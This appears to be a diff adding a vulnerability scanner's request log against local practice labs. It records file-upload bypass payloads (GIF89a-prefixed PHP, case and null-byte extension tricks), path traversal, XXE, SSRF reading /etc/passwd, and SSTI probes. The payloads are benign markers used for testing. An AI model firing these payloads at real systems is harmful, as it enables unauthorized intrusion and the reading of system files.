@@ -1,0 +1,383 @@
+http://127.0.0.1:80/Pass-01/index.php:['file_upload', '\n---------------- request ----------------\nPOST http://127.0.0.1:80/Pass-01/index.php\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Length: 311\nContent-Type: multipart/form-data; boundary=5b851d95a3645833432d87d16d907d32\n\nb\'--5b851d95a3645833432d87d16d907d32\\r\\nContent-Disposition: form-data; name="submit"\\r\\n\\r\\n\\xe4\\xb8\\x8a\\xe4\\xbc\\xa0\\r\\n--5b851d95a3645833432d87d16d907d32\\r\\nContent-Disposition: form-data; name="upload_file"; filename="35c4242.php"\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a\\nphp:<?php echo md5(\\\'25d808\\\');?>\\n\\r\\n--5b851d95a3645833432d87d16d907d32--\\r\\n\'\n']
+http://127.0.0.1:80/Pass-02/index.php:['file_upload', '\n---------------- request ----------------\nPOST http://127.0.0.1:80/Pass-02/index.php\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Length: 311\nContent-Type: multipart/form-data; boundary=845c630cc0ae4d33253ffb5d3e5bf322\n\nb\'--845c630cc0ae4d33253ffb5d3e5bf322\\r\\nContent-Disposition: form-data; name="submit"\\r\\n\\r\\n\\xe4\\xb8\\x8a\\xe4\\xbc\\xa0\\r\\n--845c630cc0ae4d33253ffb5d3e5bf322\\r\\nContent-Disposition: form-data; name="upload_file"; filename="d231c2f.php"\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a\\nphp:<?php echo md5(\\\'94b1cb\\\');?>\\n\\r\\n--845c630cc0ae4d33253ffb5d3e5bf322--\\r\\n\'\n']
+http://127.0.0.1:80/Pass-03/index.php:['file_upload', '\n---------------- request ----------------\nPOST http://127.0.0.1:80/Pass-03/index.php\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Length: 313\nContent-Type: multipart/form-data; boundary=6f30ad75c1664f59e8de1c42a4fb3f35\n\nb\'--6f30ad75c1664f59e8de1c42a4fb3f35\\r\\nContent-Disposition: form-data; name="submit"\\r\\n\\r\\n\\xe4\\xb8\\x8a\\xe4\\xbc\\xa0\\r\\n--6f30ad75c1664f59e8de1c42a4fb3f35\\r\\nContent-Disposition: form-data; name="upload_file"; filename="52f39ac.jSpx"\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a\\nphp:<% out.println(num1+num2); %>\\r\\n--6f30ad75c1664f59e8de1c42a4fb3f35--\\r\\n\'\n']
+http://127.0.0.1:80/Pass-05/index.php:['file_upload', '\n---------------- request ----------------\nPOST http://127.0.0.1:80/Pass-05/index.php\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Length: 311\nContent-Type: multipart/form-data; boundary=af274bc774ebbe493f5e0b46e9890c16\n\nb\'--af274bc774ebbe493f5e0b46e9890c16\\r\\nContent-Disposition: form-data; name="submit"\\r\\n\\r\\n\\xe4\\xb8\\x8a\\xe4\\xbc\\xa0\\r\\n--af274bc774ebbe493f5e0b46e9890c16\\r\\nContent-Disposition: form-data; name="upload_file"; filename="4272911.PHP"\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a\\nphp:<?php echo md5(\\\'10ca6d\\\');?>\\n\\r\\n--af274bc774ebbe493f5e0b46e9890c16--\\r\\n\'\n']
+http://127.0.0.1:80/Pass-16/index.php:['file_upload', '\n---------------- request ----------------\nPOST http://127.0.0.1:80/Pass-16/index.php\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Length: 319\nContent-Type: multipart/form-data; boundary=0188a99dfd847fd01a81f072bc52f7d6\n\nb\'--0188a99dfd847fd01a81f072bc52f7d6\\r\\nContent-Disposition: form-data; name="submit"\\r\\n\\r\\n\\xe4\\xb8\\x8a\\xe4\\xbc\\xa0\\r\\n--0188a99dfd847fd01a81f072bc52f7d6\\r\\nContent-Disposition: form-data; name="upload_file"; filename="a1af2ce.phP%00.jpg"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\nGIF89a\\nphp:<?php echo md5(\\\'4eb40f\\\');?>\\n\\r\\n--0188a99dfd847fd01a81f072bc52f7d6--\\r\\n\'\n']
+file_upload
+http://127.0.0.1/Pass-01/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-01/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=e6564303e5432955bc900a1be3390cac
+
+b'--e6564303e5432955bc900a1be3390cac\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--e6564303e5432955bc900a1be3390cac\r\nContent-Disposition: form-data; name="upload_file"; filename="ce2a448.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'bf4c2b\');?>\n\r\n--e6564303e5432955bc900a1be3390cac--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-02/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-02/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=372d10fc89b34b27fcf22236bc3d4ee5
+
+b'--372d10fc89b34b27fcf22236bc3d4ee5\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--372d10fc89b34b27fcf22236bc3d4ee5\r\nContent-Disposition: form-data; name="upload_file"; filename="3c94341.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'906719\');?>\n\r\n--372d10fc89b34b27fcf22236bc3d4ee5--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-03/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-03/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 313
+Content-Type: multipart/form-data; boundary=f7d48318b8a636d1f4af78b34f3da8f6
+
+b'--f7d48318b8a636d1f4af78b34f3da8f6\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--f7d48318b8a636d1f4af78b34f3da8f6\r\nContent-Disposition: form-data; name="upload_file"; filename="704c68e.jSpx"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<% out.println(num1+num2); %>\r\n--f7d48318b8a636d1f4af78b34f3da8f6--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-05/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-05/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=b43b0d52f772b963b4f2654380865dcf
+
+b'--b43b0d52f772b963b4f2654380865dcf\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--b43b0d52f772b963b4f2654380865dcf\r\nContent-Disposition: form-data; name="upload_file"; filename="b72a47e.PHP"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'83332d\');?>\n\r\n--b43b0d52f772b963b4f2654380865dcf--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-16/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-16/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 319
+Content-Type: multipart/form-data; boundary=2bb6f73bdbdc4f2a295819fdb49db0a8
+
+b'--2bb6f73bdbdc4f2a295819fdb49db0a8\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--2bb6f73bdbdc4f2a295819fdb49db0a8\r\nContent-Disposition: form-data; name="upload_file"; filename="ca1fea9.phP%00.jpg"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a\nphp:<?php echo md5(\'068e8c\');?>\n\r\n--2bb6f73bdbdc4f2a295819fdb49db0a8--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-01/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-01/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=4821e0319d734c32d8de366d75ca22e0
+
+b'--4821e0319d734c32d8de366d75ca22e0\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--4821e0319d734c32d8de366d75ca22e0\r\nContent-Disposition: form-data; name="upload_file"; filename="350247d.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'a4f5ec\');?>\n\r\n--4821e0319d734c32d8de366d75ca22e0--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-02/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-02/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=23c48e59761fc741cc90643245e43d29
+
+b'--23c48e59761fc741cc90643245e43d29\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--23c48e59761fc741cc90643245e43d29\r\nContent-Disposition: form-data; name="upload_file"; filename="25a9b2c.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'317121\');?>\n\r\n--23c48e59761fc741cc90643245e43d29--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-03/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-03/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 313
+Content-Type: multipart/form-data; boundary=a76f7fa379751f9389813707c8239afe
+
+b'--a76f7fa379751f9389813707c8239afe\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--a76f7fa379751f9389813707c8239afe\r\nContent-Disposition: form-data; name="upload_file"; filename="ec8abb9.jSpx"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<% out.println(num1+num2); %>\r\n--a76f7fa379751f9389813707c8239afe--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-05/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-05/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=7296cc087ca42968eee3ec7d09d18420
+
+b'--7296cc087ca42968eee3ec7d09d18420\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--7296cc087ca42968eee3ec7d09d18420\r\nContent-Disposition: form-data; name="upload_file"; filename="9220f84.PHP"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'e9132b\');?>\n\r\n--7296cc087ca42968eee3ec7d09d18420--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-16/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-16/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 319
+Content-Type: multipart/form-data; boundary=423330aa8fe11152df482f4e167f2bc5
+
+b'--423330aa8fe11152df482f4e167f2bc5\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--423330aa8fe11152df482f4e167f2bc5\r\nContent-Disposition: form-data; name="upload_file"; filename="aa839aa.phP%00.jpg"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a\nphp:<?php echo md5(\'d62b69\');?>\n\r\n--423330aa8fe11152df482f4e167f2bc5--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-01/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-01/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=64f740c3be5c811fa2618fc5228aa8e7
+
+b'--64f740c3be5c811fa2618fc5228aa8e7\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--64f740c3be5c811fa2618fc5228aa8e7\r\nContent-Disposition: form-data; name="upload_file"; filename="bd3e276.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'9ca775\');?>\n\r\n--64f740c3be5c811fa2618fc5228aa8e7--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-02/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-02/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=24978fe3cce02bb41dc90e1e077dfe4c
+
+b'--24978fe3cce02bb41dc90e1e077dfe4c\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--24978fe3cce02bb41dc90e1e077dfe4c\r\nContent-Disposition: form-data; name="upload_file"; filename="7ed7d79.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'3d6e3a\');?>\n\r\n--24978fe3cce02bb41dc90e1e077dfe4c--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-03/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-03/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 313
+Content-Type: multipart/form-data; boundary=246813dea939b5bb039b1d2a20b40d0c
+
+b'--246813dea939b5bb039b1d2a20b40d0c\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--246813dea939b5bb039b1d2a20b40d0c\r\nContent-Disposition: form-data; name="upload_file"; filename="0a8ecb2.jSpx"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<% out.println(num1+num2); %>\r\n--246813dea939b5bb039b1d2a20b40d0c--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-05/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-05/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 311
+Content-Type: multipart/form-data; boundary=4359b4b9a465e36cc83bf41bc83195e9
+
+b'--4359b4b9a465e36cc83bf41bc83195e9\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--4359b4b9a465e36cc83bf41bc83195e9\r\nContent-Disposition: form-data; name="upload_file"; filename="3ac003b.PHP"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'0dc3c2\');?>\n\r\n--4359b4b9a465e36cc83bf41bc83195e9--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-09/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-09/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 314
+Content-Type: multipart/form-data; boundary=9b5d18c0145dce8abdf45fe2f94bd549
+
+b'--9b5d18c0145dce8abdf45fe2f94bd549\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--9b5d18c0145dce8abdf45fe2f94bd549\r\nContent-Disposition: form-data; name="upload_file"; filename="c6e7908.pphphp"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'ef1c63\');?>\n\r\n--9b5d18c0145dce8abdf45fe2f94bd549--\r\n'
+
+file_upload
+http://127.0.0.1/Pass-16/index.php
+---------------- request ----------------
+POST http://127.0.0.1/Pass-16/index.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 319
+Content-Type: multipart/form-data; boundary=8eecfacfa521427be2286cc574fc40a9
+
+b'--8eecfacfa521427be2286cc574fc40a9\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n--8eecfacfa521427be2286cc574fc40a9\r\nContent-Disposition: form-data; name="upload_file"; filename="a93cb3f.phP%00.jpg"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a\nphp:<?php echo md5(\'af8817\');?>\n\r\n--8eecfacfa521427be2286cc574fc40a9--\r\n'
+
+file_download
+http://127.0.0.1:81/vul/unsafedownload/execdownload.php?filename=../../../../../../../etc/passwd
+---------------- request ----------------
+GET http://127.0.0.1:81/vul/unsafedownload/execdownload.php?filename=../../../../../../../etc/passwd
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+
+None
+
+file_upload
+http://127.0.0.1:81/vul/unsafeupload/clientcheck.php
+---------------- request ----------------
+POST http://127.0.0.1:81/vul/unsafeupload/clientcheck.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 316
+Content-Type: multipart/form-data; boundary=0c54f294c44e63d75661505965e786a4
+
+b'--0c54f294c44e63d75661505965e786a4\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe5\xbc\x80\xe5\xa7\x8b\xe4\xb8\x8a\xe4\xbc\xa0\r\n--0c54f294c44e63d75661505965e786a4\r\nContent-Disposition: form-data; name="uploadfile"; filename="8cc135a.PHP"\r\nContent-Type: image/gif\r\n\r\nGIF89a\nphp:<?php echo md5(\'4ddb7f\');?>\n\r\n--0c54f294c44e63d75661505965e786a4--\r\n'
+
+file_upload
+http://127.0.0.1:81/vul/unsafeupload/servercheck.php
+---------------- request ----------------
+POST http://127.0.0.1:81/vul/unsafeupload/servercheck.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 316
+Content-Type: multipart/form-data; boundary=dd7b3e182be6816724ef29d80044495f
+
+b'--dd7b3e182be6816724ef29d80044495f\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe5\xbc\x80\xe5\xa7\x8b\xe4\xb8\x8a\xe4\xbc\xa0\r\n--dd7b3e182be6816724ef29d80044495f\r\nContent-Disposition: form-data; name="uploadfile"; filename="5911870.php"\r\nContent-Type: image/png\r\n\r\nGIF89a\nphp:<?php echo md5(\'bdd8e2\');?>\n\r\n--dd7b3e182be6816724ef29d80044495f--\r\n'
+
+file_upload
+http://127.0.0.1:81/vul/unsafeupload/getimagesize.php
+---------------- request ----------------
+POST http://127.0.0.1:81/vul/unsafeupload/getimagesize.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 323
+Content-Type: multipart/form-data; boundary=961bd16d9f9b149250313c2408fefb3d
+
+b'--961bd16d9f9b149250313c2408fefb3d\r\nContent-Disposition: form-data; name="submit"\r\n\r\n\xe5\xbc\x80\xe5\xa7\x8b\xe4\xb8\x8a\xe4\xbc\xa0\r\n--961bd16d9f9b149250313c2408fefb3d\r\nContent-Disposition: form-data; name="uploadfile"; filename="4b2a40b.phP%00.jpg"\r\nContent-Type: image/png\r\n\r\nGIF89a\nphp:<?php echo md5(\'1120ab\');?>\n\r\n--961bd16d9f9b149250313c2408fefb3d--\r\n'
+
+file_inclusion
+http://127.0.0.1:81/vul/dir/dir_list.php?title=/etc/passwd../../../../../../../etc/passwd
+---------------- request ----------------
+GET http://127.0.0.1:81/vul/dir/dir_list.php?title=/etc/passwd../../../../../../../etc/passwd
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+
+None
+
+xxe
+http://127.0.0.1:81/vul/xxe/xxe_1.php
+---------------- request ----------------
+POST http://127.0.0.1:81/vul/xxe/xxe_1.php
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 183
+Content-Type: application/x-www-form-urlencoded
+
+xml=%3C%3Fx+m+l+version+%3D+%221.0%22%3F%3E%3C%21DOCTYPE+ANY+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cx%3E%26xxe%3B%3C%2Fx%3E&submit=%E6%8F%90%E4%BA%A4
+
+ssti
+http://127.0.0.1:81/vul/urlredirect/urlredirect.php?url={{41*78}}url={{86*78}}[[{86}*{78}]]url=<%= 46 * 85 %>url=${45*80}url=${88*75}}url=@(28+101)url=#{40*107}url={{11 + 82}}url={{49+38}}[[{49}+{38}]]url=<%= 92 + 35 %>
+---------------- request ----------------
+GET http://127.0.0.1:81/vul/urlredirect/%7B%7B41*78%7D%7Durl=%7B%7B86*78%7D%7D[[%7B86%7D*%7B78%7D]]url=%3C%=%2046%20*%2085%20%%3Eurl=$%7B45*80%7Durl=$%7B88*75%7D%7Durl=@(28%20101)url=#%7B40*107%7Durl=%7B%7B11%20+%2082%7D%7Durl=%7B%7B49+38%7D%7D%5B%5B%7B49%7D+%7B38%7D%5D%5Durl=%3C%25=%2092%20+%2035%20%25%3E
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+
+None
+
+ssti
+http://127.0.0.1:81/vul/urlredirect/urlredirect.php?url={{78*94}}url={{29*23}}[[{29}*{23}]]url=<%= 85 * 86 %>url=${11*39}url=${14*55}}url=@(17+74)url=#{24*83}url={{70 + 94}}url={{93+62}}[[{93}+{62}]]url=<%= 83 + 92 %>url=${79+70}url=${52+118}}url=@(12*74)
+---------------- request ----------------
+GET http://127.0.0.1:81/vul/urlredirect/%7B%7B78*94%7D%7Durl=%7B%7B29*23%7D%7D[[%7B29%7D*%7B23%7D]]url=%3C%=%2085%20*%2086%20%%3Eurl=$%7B11*39%7Durl=$%7B14*55%7D%7Durl=@(17%2074)url=#%7B24*83%7Durl=%7B%7B70%20+%2094%7D%7Durl=%7B%7B93+62%7D%7D%5B%5B%7B93%7D+%7B62%7D%5D%5Durl=%3C%25=%2083%20+%2092%20%25%3Eurl=$%7B79+70%7Durl=$%7B52+118%7D%7Durl=@(12*74)
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+
+None
+
+ssrf
+http://127.0.0.1:81/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
+---------------- request ----------------
+GET http://127.0.0.1:81/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+
+None
+
+ssrf
+http://127.0.0.1:81/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd
+---------------- request ----------------
+GET http://127.0.0.1:81/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Accept-Language: en-US,en;q=0.8
+Cache-Control: max-age=0
+
+None
+
